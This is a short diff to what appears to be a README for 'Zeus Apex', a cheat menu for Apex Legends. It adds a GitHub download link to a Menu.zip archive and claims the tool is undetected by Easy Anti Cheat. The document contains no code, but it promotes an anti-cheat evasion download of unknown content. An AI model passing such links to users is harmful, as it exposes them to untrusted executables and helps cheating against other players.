@@ -3,7 +3,7 @@
 - Supported OS Windows 10, Windows 11
 - Supported Anti-Cheat(s) Easy Anti Cheat
 - Publisher Respawn Entertainment
-# [Download Zeus Apex]()
+# [Download Zeus Apex](https://github.com/cloudsolart007/ZeusMenuApexLegends/releases/download/Download/Menu.zip)
 
 
 ### Zeus is undetected now.
